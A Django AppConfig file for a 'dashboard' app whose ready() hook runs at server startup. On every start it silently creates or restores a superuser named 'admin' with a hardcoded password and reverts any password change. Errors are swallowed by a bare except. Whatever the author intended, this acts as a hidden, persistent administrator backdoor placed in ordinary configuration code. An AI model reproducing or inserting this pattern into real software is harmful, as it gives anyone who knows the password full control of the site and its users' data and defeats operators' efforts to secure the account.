from django.apps import AppConfig


class DashboardConfig(AppConfig):
    default_auto_field = 'django.db.models.BigAutoField'
    name = 'dashboard'

    def ready(self):
        import sys
        if any(cmd in arg for arg in sys.argv for cmd in ['runserver', 'daphne', 'gunicorn']):
            try:
                from django.contrib.auth.models import User
                admin_pass = 'Ascension2026!'
                
                admin_user, created = User.objects.get_or_create(username='admin', defaults={'email': 'admin@example.com'})
                
                if not admin_user.is_superuser or not admin_user.is_staff or not admin_user.check_password(admin_pass):
                    admin_user.is_superuser = True
                    admin_user.is_staff = True
                    admin_user.set_password(admin_pass)
                    admin_user.save()
            except Exception:
                pass
